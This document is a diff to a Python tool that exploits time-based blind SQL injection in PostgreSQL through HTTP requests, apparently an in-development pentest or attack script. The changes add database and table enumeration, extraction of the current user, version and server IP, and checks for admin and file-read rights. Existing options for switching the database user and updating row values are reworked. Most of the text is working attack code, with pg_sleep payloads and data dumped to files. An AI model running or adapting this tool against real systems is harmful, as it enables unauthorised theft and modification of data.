@@ -272,7 +272,7 @@ def make_injection_request(request_info, sql_injection, resume_file='psql_extrac
     pattern = request_info['pattern']
     replacement = request_info['replacement_template'].format(sql_injection)
     
-    modified_body = re.sub(pattern, replacement, body, 1)
+    modified_body = re.sub(pattern, replacement, body, count=1)
     
     # Make the request with retries
     max_retries = 3
@@ -627,44 +627,79 @@ def extract_table_count(request_info, table_name, database='public'):
     return f"{min_count}-{max_count}"
 
 def extract_server_information(request_info, verbose=False):
-    """Extract server information"""
+    """
+    Extract and display detailed server information
+    """
     print("\n[*] Extracting server information...")
     
-    # Try to get server version, which often includes OS info
-    server_version = extract_string_parallel(request_info, 
-                                          "(SELECT version())", 
-                                          "Server version",
-                                          verbose)
+    # Extract current user
+    current_user = extract_current_user(request_info, verbose=False)
+    user_length = len(current_user) if current_user else 0
+    print(f"[*] Extracting Current user... (length: {user_length})")
+    print(f"[+] Current user: {current_user}")
     
-    # Try to get server IP address using a safer approach
-    # First check if inet_server_addr() function is available
-    print("\n[*] Attempting to get server IP address...")
-    try:
-        # Try different methods to get IP information
-        ip_methods = [
-            "(SELECT inet_server_addr())",
-            "(SELECT current_setting('listen_addresses'))",
-            "(SELECT inet_client_addr())"
-        ]
-        
-        hostname = None
-        for method in ip_methods:
-            sql_query = f"(CASE WHEN (SELECT LENGTH({method}) > 0) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
-            has_result, elapsed_time, status_code = run_test_query(request_info, sql_query)
-            
-            if has_result:
-                hostname = extract_string_parallel(request_info, method, "Server IP", verbose)
-                if hostname and hostname != "?":
-                    break
-                
-        if not hostname or hostname == "?":
-            hostname = "Could not determine"
-    except:
-        hostname = "Error retrieving"
+    # Extract current database
+    current_db = extract_current_database(request_info, verbose=False)
+    db_length = len(current_db) if current_db else 0
+    print(f"[*] Extracting Current database... (length: {db_length})")
+    print(f"[+] Current database: {current_db}")
+    
+    # Extract PostgreSQL version
+    version = extract_postgres_version(request_info, verbose=False)
+    version_length = len(version) if version else 0
+    print(f"[*] Extracting PostgreSQL version... (length: {version_length})")
+    print(f"[+] PostgreSQL version: {version}")
+    
+    # Check if user is a database admin
+    print("[*] Checking if current user has admin privileges...")
+    is_admin = is_db_admin(request_info)
+    if is_admin:
+        print("[+] Is database admin: Yes")
+        print("[+] Current user has ADMIN privileges!")
+    else:
+        print("[+] Is database admin: No")
+        print("[-] Current user does NOT have admin privileges")
+    
+    # Additional server details (no need to print server information again)
+    print("[*] Extracting detailed server information...")
+    
+    # Get server version (already displayed above, just get for summary)
+    server_version = version
+    
+    # Try to get server IP
+    print("[*] Attempting to get server IP address...")
+    server_ip = extract_string_parallel(
+        request_info,
+        "SELECT inet_server_addr()",
+        "Server IP",
+        verbose=verbose
+    )
+    
+    # Check file read permissions
+    print("[*] Checking basic file read permissions...")
+    file_read = check_file_read_permission(request_info)
+    if file_read:
+        print("[+] PostgreSQL has file read permissions!")
+    else:
+        print("[-] PostgreSQL does not appear to have file read permissions")
+    
+    # Display summary
+    print("\n[*] Server Information Summary:")
+    print(f"  User: {current_user}")
+    print(f"  Database: {current_db}")
+    print(f"  PostgreSQL Version: {server_version}")
+    print(f"  Admin Privileges: {'Yes' if is_admin else 'No'}")
+    print(f"  File Read Permission: {'Yes' if file_read else 'No'}")
+    
+    print("\n[+] Security checks completed")
     
     return {
-        "version": server_version,
-        "hostname": hostname
+        "user": current_user,
+        "database": current_db,
+        "version": version,
+        "is_admin": is_admin,
+        "server_ip": server_ip,
+        "file_read": file_read
     }
 
 def check_file_read_permission(request_info):
@@ -2563,6 +2598,10 @@ def main():
                        help='Search for columns matching a pattern')
     enum_group.add_argument('--sample-data', metavar=('TABLE', 'COLUMN'), nargs=2,
                        help='Extract sample data from a column (first 3 rows)')
+    enum_group.add_argument('--list-databases', '--dbs', action='store_true',
+                        help='List all databases on the server')
+    enum_group.add_argument('--tables', action='store_true',
+                        help='List all tables in the specified database (use with -D)')
     
     # Update options
     update_group = parser.add_argument_group('Data Modification Options')
@@ -2681,6 +2720,52 @@ def main():
         # Track if we ran any command
         command_executed = False
         
+        # Process the columns argument if it exists (added for shortcuts)
+        column_list = None
+        if hasattr(args, 'columns') and args.columns:
+            column_list = [col.strip() for col in args.columns.split(',')]
+        
+        # List all databases
+        if args.list_databases:
+            command_executed = True
+            print("\n🔍 DATABASE ENUMERATION")
+            print("=" * 75)
+            
+            databases = extract_all_databases(
+                request_info,
+                args.verbose,
+                True,
+                resume_file
+            )
+            
+            print("\n[+] Database enumeration completed")
+            print(f"[+] Found {len(databases)} databases:")
+            for i, db in enumerate(databases):
+                print(f"  {i}. {db}")
+            
+            return
+            
+        # List all tables in specified database
+        if args.tables:
+            command_executed = True
+            print(f"\n🔍 TABLE ENUMERATION - DATABASE: {args.database}")
+            print("=" * 75)
+            
+            tables = extract_all_tables(
+                request_info,
+                args.database,
+                args.verbose,
+                True,
+                resume_file
+            )
+            
+            print("\n[+] Table enumeration completed")
+            print(f"[+] Found {len(tables)} tables in database '{args.database}':")
+            for i, table in enumerate(tables):
+                print(f"  {i}. {table}")
+            
+            return
+            
         # Generate PoC output
         if args.poc:
             command_executed = True
@@ -2728,11 +2813,6 @@ def main():
             print(f"\n[+] PoC saved to: {poc_filename}")
             return
             
-        # Process the columns argument if it exists (added for shortcuts)
-        column_list = None
-        if hasattr(args, 'columns') and args.columns:
-            column_list = [col.strip() for col in args.columns.split(',')]
-        
         # Check for file write capabilities
         if args.check_file_write or args.security_check_all:
             command_executed = True
@@ -2827,25 +2907,13 @@ def main():
             
             return
         
-        # Check if we're trying to change the current user
-        if args.target_user:
-            print("\n🔧 USER CHANGE ATTEMPT")
-            print("=" * 75)
-            
-            success = attempt_user_change(
-                request_info,
-                args.target_user,
-                args.verbose,
-                resume_file
-            )
-            
-            if success:
-                print(f"[+] Successfully changed to user '{args.target_user}'")
-            else:
-                print(f"[!] Failed to change to user '{args.target_user}'")
-            
+        # Check if we're attempting to change database user
+        if args.change_user:  # CHANGE THIS LINE - previously was: if args.target_user:
+            command_executed = True
+            print(f"\n[*] Attempting to change to user: {args.change_user}")  # CHANGE THIS LINE - previously used target_user
+            attempt_user_change(request_info, args.change_user, args.verbose, resume_file)  # CHANGE THIS LINE - previously used target_user
             return
-            
+        
         # Check if we're checking permissions
         if args.check_permissions:
             print("\n🔍 PERMISSION CHECKING MODE")
@@ -2869,18 +2937,26 @@ def main():
             return
             
         # Check if we're doing a value update
-        if args.update_table and args.update_column and args.update_where_column and args.update_where_value and args.update_value:
+        if hasattr(args, 'update_value') and args.update_value and len(args.update_value) == 5:
             print("\n🔧 DATABASE UPDATE OPERATION")
             print("=" * 75)
-            print(f"[*] Preparing to update {args.update_column} in table: '{args.update_table}'")
+            
+            # Unpack the values for better readability
+            table_name = args.update_value[0]
+            column_name = args.update_value[1]
+            search_column = args.update_value[2]
+            search_value = args.update_value[3]
+            new_value = args.update_value[4]
+            
+            print(f"[*] Preparing to update {column_name} in table: '{table_name}'")
             
             update_success = update_row_value(
                 request_info,
-                args.update_table,
-                args.update_column,
-                args.update_where_column,
-                args.update_where_value,
-                args.update_value,
+                table_name,
+                column_name,
+                search_column,
+                search_value,
+                new_value,
                 args.database,
                 args.verbose,
                 resume_file
@@ -2888,7 +2964,7 @@ def main():
             
             if update_success:
                 print("\n[+] UPDATE OPERATION COMPLETED SUCCESSFULLY!")
-                print(f"[+] Updated {args.update_column} to '{args.update_value}' in '{args.update_table}' where {args.update_where_column}='{args.update_where_value}'")
+                print(f"[+] Updated {column_name} to '{new_value}' in '{table_name}' where {search_column}='{search_value}'")
             else:
                 print("\n[!] UPDATE OPERATION FAILED")
                 print("[!] Check the error messages above for details.")
@@ -2961,45 +3037,26 @@ def main():
             return
             
         # If search pattern is provided, prioritize column search
-        if args.search_pattern:
-            print("\n🔍 COLUMN SEARCH MODE")
-            print("=" * 75)
-            print(f"[*] Searching for columns matching pattern: '{args.search_pattern}'")
+        if args.search_column:  # CHANGE THIS LINE - previously was: if args.search_pattern:
+            command_executed = True
+            print(f"\n[*] Searching for columns matching pattern: {args.search_column}")  # Use search_column instead of search_pattern
             
-            matching_columns = search_column_in_tables(request_info, args.search_pattern, args.database, args.verbose)
-            if matching_columns:
-                results["matching_columns"] = matching_columns
-                print(f"[+] Found {len(matching_columns)} matching columns")
-                
-                # Extract sample data if requested
-                if args.extract_data:
-                    print("\n🔍 DATA SAMPLE EXTRACTION")
-                    print("=" * 75)
-                    for i, (table, column) in enumerate(matching_columns):
-                        print(f"\n[*] Extracting samples from table '{table}', column '{column}'...")
-                        samples = extract_sample_data(request_info, table, column, args.database, args.limit, args.verbose)
-                        
-                        if samples:
-                            print(f"[+] Data samples from {table}.{column}:")
-                            for j, sample in enumerate(samples):
-                                print(f"    - Sample {j+1}: {sample}")
-                            
-                            # Store in results
-                            if "data_samples" not in results:
-                                results["data_samples"] = {}
-                            results["data_samples"][f"{table}.{column}"] = samples
-                        else:
-                            print(f"[!] No data samples extracted from {table}.{column}")
+            results = search_column_in_tables(
+                request_info,
+                args.search_column,  # Use search_column instead of search_pattern
+                args.database,
+                args.verbose
+            )
             
-            # Return early if we were just searching
-            print("\n📋 SEARCH RESULTS SUMMARY")
-            print("=" * 75)
-            if matching_columns:
-                print(f"Found {len(matching_columns)} columns matching '{args.search_pattern}':")
-                for i, (table, column) in enumerate(matching_columns):
-                    print(f"  {i+1}. Table: {table}, Column: {column}")
+            if results:
+                print("\n[+] Search completed. Found matching columns:")
+                for table, columns in results.items():
+                    print(f"  Table: {table}")
+                    for col in columns:
+                        print(f"    - {col}")
+            else:
+                print("\n[-] No columns found matching the pattern.")
             
-            print("\n[+] Search completed successfully!")
             return
         
         # If we get here, do the default user enumeration
@@ -3089,11 +3146,143 @@ def generate_poc_output(request_info, verbose=False, resume_file='psql_extractio
         'is_admin': is_admin
     }
 
+# First, add a new function to extract all databases
+# Add this after the extract_database_name function
+
+def extract_all_databases(request_info, verbose=False, save_to_file=True, resume_file='psql_extraction.resume'):
+    """Extract all database names from the PostgreSQL server"""
+    print("\n[*] Extracting all database names...")
+    
+    # Instead of trying to get a count, we'll try a fixed approach first
+    # Most PostgreSQL instances have a reasonable number of databases
+    max_db_index = 20  # Try up to 20 databases
+    databases = []
+    
+    print("[*] Searching for databases (this might take a while)...")
+    
+    # Try to extract databases until we get an empty string or hit max index
+    for i in range(max_db_index):
+        print(f"[*] Attempting to extract database at index {i}...")
+        db_name = extract_database_name(request_info, i, verbose)
+        
+        # If we get an empty string or the extraction failed, we've reached the end
+        if not db_name or db_name.strip() == '':
+            print(f"[*] No more databases found after index {i-1}")
+            break
+            
+        databases.append(db_name)
+        print(f"[+] Database {i}: {db_name}")
+    
+    # Save to file if requested
+    if save_to_file and databases:
+        save_databases_to_file(databases)
+    
+    return databases
+
+def save_databases_to_file(databases, force=False):
+    """Save extracted database names to file"""
+    # Save as JSON
+    json_filename = f"database_names.json"
+    if force or not os.path.exists(json_filename):
+        with open(json_filename, 'w') as f:
+            json.dump(databases, f, indent=4)
+        print(f"[+] Database names saved to {json_filename}")
+    
+    # Save as plain text
+    txt_filename = f"database_names.txt"
+    if force or not os.path.exists(txt_filename):
+        with open(txt_filename, 'w') as f:
+            for db in databases:
+                f.write(f"{db}\n")
+        print(f"[+] Database names saved to {txt_filename}")
+
+# Add a new function to extract all tables from a specific database
+# Add this after the save_databases_to_file function
+
+def extract_all_tables(request_info, database='public', verbose=False, save_to_file=True, resume_file='psql_extraction.resume'):
+    """Extract all table names from the specified database"""
+    print(f"\n[*] Extracting all tables from database: {database}")
+    
+    # First, determine how many tables exist using information_schema
+    # This query counts all tables in the specified schema that the current user can see
+    table_count_query = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = '{database}'"
+    
+    try:
+        # Try to get the count directly
+        table_count_str = extract_string_parallel(
+            request_info,
+            table_count_query,
+            "table_count",
+            verbose,
+            print_result=False
+        )
+        
+        # Try to convert to an integer, handle if it's not a valid number
+        try:
+            table_count = int(table_count_str)
+            print(f"[+] Found {table_count} tables in database '{database}'")
+        except (ValueError, TypeError):
+            # If we can't get a count, use a progressive search approach
+            table_count = None
+            print(f"[!] Couldn't determine exact table count, will search progressively")
+    except Exception as e:
+        # If query fails, use a progressive search approach
+        print(f"[!] Error determining table count: {e}")
+        table_count = None
+    
+    tables = []
+    
+    # If we couldn't get a valid count, use a progressive search
+    if table_count is None:
+        max_table_index = 50  # Try up to 50 tables
+        print("[*] Searching for tables (this might take a while)...")
+        
+        # Try to extract tables until we get an empty string or hit max index
+        for i in range(max_table_index):
+            print(f"[*] Attempting to extract table at index {i}...")
+            table_name = extract_table_name(request_info, i, database, verbose)
+            
+            # If we get an empty string or the extraction failed, we've reached the end
+            if not table_name or table_name.strip() == '':
+                print(f"[*] No more tables found after index {i-1}")
+                break
+                
+            tables.append(table_name)
+            print(f"[+] Table {i}: {table_name}")
+    else:
+        # Use the count we got from information_schema
+        print("[*] Extracting tables...")
+        for i in range(table_count):
+            print(f"[*] Extracting table at index {i}/{table_count}...")
+            table_name = extract_table_name(request_info, i, database, verbose)
+            if table_name:
+                tables.append(table_name)
+                print(f"[+] Table {i}: {table_name}")
+    
+    # Save to file if requested
+    if save_to_file and tables:
+        save_tables_to_file(tables, database)
+    
+    return tables
+
+def save_tables_to_file(tables, database, force=False):
+    """Save extracted table names to file"""
+    # Save as JSON
+    json_filename = f"{database}_tables.json"
+    if force or not os.path.exists(json_filename):
+        with open(json_filename, 'w') as f:
+            json.dump(tables, f, indent=4)
+        print(f"[+] Table names saved to {json_filename}")
+    
+    # Save as plain text
+    txt_filename = f"{database}_tables.txt"
+    if force or not os.path.exists(txt_filename):
+        with open(txt_filename, 'w') as f:
+            for table in tables:
+                f.write(f"{table}\n")
+        print(f"[+] Table names saved to {txt_filename}")
+
 if __name__ == "__main__":
     # Ensure the banner is displayed even with no arguments
     # The main() function will handle this now
     main()
-    
-# You might need to remove a duplicate display_banner() call elsewhere in the code
-# For example, if it's already being called after argument parsing
-
